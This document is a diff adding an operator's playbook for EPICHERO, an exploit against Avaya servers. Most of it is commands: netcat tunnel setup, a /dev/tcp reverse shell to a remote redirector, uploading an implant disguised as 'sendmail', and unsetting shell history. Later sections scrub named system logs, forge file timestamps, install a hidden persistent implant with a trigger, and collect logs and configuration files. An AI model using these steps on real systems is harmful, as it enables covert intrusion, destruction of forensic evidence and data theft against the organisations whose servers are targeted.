@@ -1,0 +1,352 @@
+# 2010-08-16 22:35:31 EDT 
+
+############################ EPICHERO
+
+mx
+:%s/WINDOWS_OPS_STATION_IP/192.168.254.72/g
+:%s/LINUX_OPS_STATION_IP/192.168.254.71/g
+:%s/LOCAL_REDIRECTOR_IP/192.168.254.72/g
+:%s/REMOTE_REDIRECTOR_IP/10.X.0.51/g
+:%s/REVERSE_SHELL_CALLBACK_PORT/5060/g
+:%s/NOPEN_LISTEN_PORT/5424/g
+:%s/ISH_CALLBACK_PORT/5061/g
+:%s/TARGET_IP/10.X.0.19/g
+:%s/TRIGGER_BOX_IP/192.168.0.1/g
+:%s#PATH_TO_EH_DIR#/current/down/epic/#g
+:%s#WORKING_DIRECTORY#/root/.history/#g
+:%s/NOPEN_NAME/sendmail/g
+'x
+
+
+#
+# First, set up your tunnels, there are a specific list of ports you should use
+# because of the default setup on the avaya servers, confirm these settings
+# after you gain access
+#
+# PORTS TO USE (IN AND OUT) check with iptables -n -L after you get on target
+#
+# 5060 5061 1719 5424 21874
+#
+
+cat << "EOF" | unix2dos | nc -vvv -l -p 33333
+monitor redirect -tcp -nodes 40 -lplisten RHP_CB_FOR_10.X.0.51 -target 127.0.0.1 1509
+monitor packetredirect -packeeettype icmp -listenport 2222
+
+monitor redirect -tcp -nodes 40 -lplisten 443 -target TARGET_IP 443
+monitor redirect -tcp -nodes 40 -implantlisten REVERSE_SHELL_CALLBACK_PORT -target LINUX_OPS_STATION_IP REVERSE_SHELL_CALLBACK_PORT
+monitor redirect -tcp -nodes 40 -lplisten NOPEN_LISTEN_PORT -target TARGET_IP NOPEN_LISTEN_PORT
+EOF
+
+#
+# On the windows box, run "telnet LINUX_OPS_STATION_IP 33333" to get your pastables
+#
+
+#
+# If you are throwing from a *Nix box (like when exploiting the second server)
+#
+
+-tunnel
+l 443 TARGET_IP 443
+r REVERSE_SHELL_CALLBACK_PORT
+l NOPEN_LISTEN_PORT TARGET_IP NOPEN_LISTEN_PORT
+s
+
+
+#
+# cd into the EPICHERO directory, check usage and run a survey command
+#
+
+cd PATH_TO_EH_DIR
+./eh
+./eh -v -i LOCAL_REDIRECTOR_IP
+
+ls -lart
+cat log
+
+#
+# you are looking for the scan and patch number to confirm the system is
+# vulnerable, check with the developer, but you are safe if the version is 3.0.0
+# SCAN:   version=S8710-013-00.0.340.3
+#                         ^ ^  ^
+#                         | |  Dot release
+#                         | Minor Version number
+#                         Major Version Number
+#
+
+
+#
+# If everything looks good, set up your reverse shell command, and make sure it
+# copied over correctly.
+#
+
+cd PATH_TO_EH_DIR
+cat << EOF > reverse.shell.script
+sh >/dev/tcp/REMOTE_REDIRECTOR_IP/REVERSE_SHELL_CALLBACK_PORT <&1 2>&1
+EOF
+
+ls -lart ; cat reverse.shell.script
+
+cp /current/up/noserver-linux NOPEN_NAME
+gzip NOPEN_NAME
+uuencode NOPEN_NAME.gz NOPEN_NAME.gz > NOPEN_NAME.gz.uu
+gedit NOPEN_NAME.gz.uu &
+
+#
+# Ok, confirm your tunnels are good to go and throw the exploit.  /tmp is
+# usually not executable, so you must find another working directory
+#
+
+nc -vvv -l -p REVERSE_SHELL_CALLBACK_PORT
+
+./eh -e -r -s reverse.shell.script -i LOCAL_REDIRECTOR_IP
+
+unset HISTFILE
+unset HISTSIZE
+unset HISTFILESIZE
+
+id
+date; date -u
+mount
+
+ls -lart /root
+ls -al /root/.history
+ls -alc /root/.history
+ls -lau /root/.history
+
+cd /root/.history
+
+pwd
+
+type uudecode gunzip
+
+uudecode; ls -lart
+
+
+gunzip NOPEN_NAME.gz
+chmod 700 NOPEN_NAME
+
+PATH=. D=-lNOPEN_LISTEN_PORT NOPEN_NAME
+
+
+#
+# Now that you have nopen up (hopefully), check tripwire
+#
+-vget /etc/tripwire/twenable.txt
+
+#
+# Save these off, peruse them later after cleanup
+#
+iptables -L -n -v > T:/current/down/iptables-Lnv.TARGET_IP
+
+
+#
+# Go through your normal cleaning process, check logs, process accounting, etc.
+# You will need to clean (at least)
+#
+#
+# /var/log/httpd/error_log
+# /var/log/ecs/commandhistory
+# /var/log/ecs/update.log
+# /var/log/secure
+# /var/log/messages
+# /var/iglut/upg_status.dat
+# /tftpboot
+
+-logs /var/iglut /tftpboot /var/log/httpd/ /var/log/ecs/
+
+#
+# Error logs are messy, it catches the nitty gritty details of our exploit, be 
+# sure to scrub the hell out of it.  The best thing to do is probaby use look
+# for obvious logs from us and use that timestamp (down to a minute or two) to
+# remove everything
+#
+
+-ls /var/log/httpd/error_log
+-tail -100 /var/log/httpd/error_log
+egrep "YOUR_TIMESTAMP" /var/log/httpd/error_log
+-gs grepout -w /root/.history "YOUR_TIMESTAMP" /var/log/httpd/error_log
+touch -t GOOD_TIME_STAMP /var/log/httpd/error_log
+
+#
+# The best thing to grep for in the next two is probably the same timestamp 
+# above timestamp of when you exploited
+#
+-ls /var/log/ecs/commandhistory
+-get /var/log/ecs/commandhistory
+-tail -50 /var/log/ecs/commandhistory
+egrep "YOUR STUFF" /var/log/ecs/commandhistory
+-gs grepout -w /root/.history "YOUR STUFF" /var/log/ecs/commandhistory
+touch -t GOOD_TIME_STAMP /var/log/ecs/commandhistory
+
+#
+#
+#
+
+-ls /var/log/ecs/update.log
+-tail -50 /var/log/ecs/update.log
+egrep "YOUR STUFF" /var/log/ecs/update.log
+-gs grepout -w  /root/.history  "YOUR STUFF" /var/log/ecs/update.log
+touch -t GOOD_TIME_STAMP /var/log/ecs/update.log
+
+#
+# The best thing to grep for in the secure log is a combination of your 
+# timestamp and sudo
+#
+
+-ls /var/log/secure
+-tail -50 /var/log/secure
+egrep "^YOUR_TIMESTAMP.*sudo" /var/log/secure
+-gs grepout -w  /root/.history "^YOUR_TIMESTAMP.*sudo" /var/log/secure
+#
+# Probably won't need to touch back times
+#
+
+#
+# The best thing to grep for in /var/log/messages is a combination of your
+# timestamp and update_show
+#
+
+-ls /var/log/messages
+-tail -50 /var/log/messages
+egrep "^YOUR_TIMESTAMP.*update_show" /var/log/messages
+-gs grepout -w  /root/.history "^YOUR_TIMESTAMP.*update_show" /var/log/messages
+
+#
+# Probably no need to touch back times
+#
+
+#
+# It is possible, we are the only thing in /var/log/httpd/ssl_requests.log,
+# if so, clear the file.  Otherwise grep out our stuff.  the timestamp format
+# is different, but you can still use the same time
+#
+
+-ls /var/log/httpd/ssl_requests.log
+-tail -50 /var/log/httpd/ssl_requests.log
+egrep "YOUR_TIMESTAMP_DIFFERENT_FORMAT" /var/log/httpd/ssl_requests.log
+
+-gs grepout -w /root/.history "YOUR_TIMESTAMP_DIFFERENT_FORMAT" /var/log/httpd/ssl_requests.log
+# OR
+cat /dev/null > /var/log/httpd/ssl_requests.log
+
+#
+# use your judgement to touch this file back to a good time
+#
+
+#
+# According to devs, we are looking for status=66 in this file, if we are the only thing here, remove the file
+#
+
+-ls /var/iglut/upg_status.dat
+-vget /var/iglut/upg_status.dat
+egrep "status=66|Upgrade failed. Unable to transfer the license file to the target unit being upgraded." /var/iglut/upg_status.dat
+egrep -v "status=66|Upgrade failed. Unable to transfer the license file to the target unit being upgraded." /var/iglut/upg_status.dat
+-gs grepout -w /root/.history "status=66|Upgrade failed. Unable to transfer the license file to the target unit being upgraded." /var/iglut/upg_status.dat
+# OR
+-rm /var/iglut/upg_status.dat
+
+#
+# And probably touch this directory back to the time of the parent directory
+#
+
+-touch /var/iglut/.. /var/iglut/.
+
+
+#
+# The exploit does save some times for you that you can touch back, these are
+# noted in the log file, on your linux ops box, enter
+#
+
+cat PATH_TO_EH_DIRlog
+
+egrep TIMES PATH_TO_EH_DIRlog
+
+mc
+:%s#FILE_HOLDING_OPT_TIMES#OPT_TIMES#g
+:%s#FILE_HOLDING_TFTPBOOT_TIMES#TFTPBOOT_TIMES#g
+:%s#FILE_HOLDING_OPT_WS_TIMES#OPT_WS_TIMES#g
+'c
+
+#
+# go ahead and use the timestamps it save for you to touch some directories back.
+#
+
+touch -r FILE_HOLDING_OPT_WS_TIMES `ls -l /opt/ws | cut -d '>' -f2`
+touch -r FILE_HOLDING_OPT_TIMES /opt
+touch -r FILE_HOLDING_TFTPBOOT_TIMES /tftpboot
+
+
+#
+# If you are good to implant, know that SAFFRONYELLOW combined with DEWDROP 
+# causes causes date to never return.  The install will (should probably) be 
+# successful, but you WILL LOOSE the window you installed from!!!!  
+# Be prepared.
+#
+
+#
+# Once you implant, you will probably need a trigger like this:
+#
+
+mx
+:%s#HIDDEN_DIR#/lib/.b625a59f5f2a26de#g
+`x
+
+#
+# Be sure you have your tunnels set up for the trigger if you are triggering 
+# through Windows
+#
+
+cat << "EOF" | unix2dos | nc -l -p 5555
+monitor redirect -tcp -nodes 40 -target LINUX_OPS_STATION_IP ISH_CALLBACK_PORT -implantlisten ISH_CALLBACK_PORT
+monitor redirect -tcp -nodes 40 -target TARGET_IP REVERSE_SHELL_CALLBACK_PORT -lplisten REVERSE_SHELL_CALLBACK_PORT
+monitor packetredirect -packettype udp -listenport 2222 -bind WINDOWS_OPS_STATION_IP
+EOF
+
+
+#
+# Once again, on windows "telnet LINUX_OPS_STATION_IP 5555"
+#
+
+ourtn -eY5U /current/up/noserver-linux -O REVERSE_SHELL_CALLBACK_PORT -p ISH_CALLBACK_PORT -i TRIGGER_BOX_IP -W WINDOWS_OPS_STATION_IP:2222 -w HIDDEN_DIR TARGET_IP
+
+#
+# And if you are attacking from a *Nix box
+#
+
+-irtun TARGET_IP ISH_CALLBACK_PORT -eY5U /current/up/noserver-linux -O REVERSE_SHELL_CALLBACK_PORT -w HIDDEN_DIR
+
+#
+# now there is some collection the developers need
+#
+
+
+-get /var/log/secure*
+-get /var/log/messages*
+-get /var/log/httpd/access_log*
+-get /var/log/httpd/ssl_request*
+-get /var/log/ecs/commandhistory.*
+-get /var/log/httpd/error_log*
+
+#
+# Get the last 2 or 3 of these
+#
+
+ls -lart /var/log/ecs/ | tail -5
+
+
+#
+# Get this file too
+#
+-lsh egrep "wlog$" /current/*timem
+
+-get /etc/opt/defty/xln1
+du -sh /etc/opt/ecs
+-get /etc/opt/ecs
+-get /etc/sysconfig/network-scripts
+-get /opt/ecssw*/tripwire.conf
+
+#
+# Now, if after all this you have time, go exploit the second guy!
+#
+
+
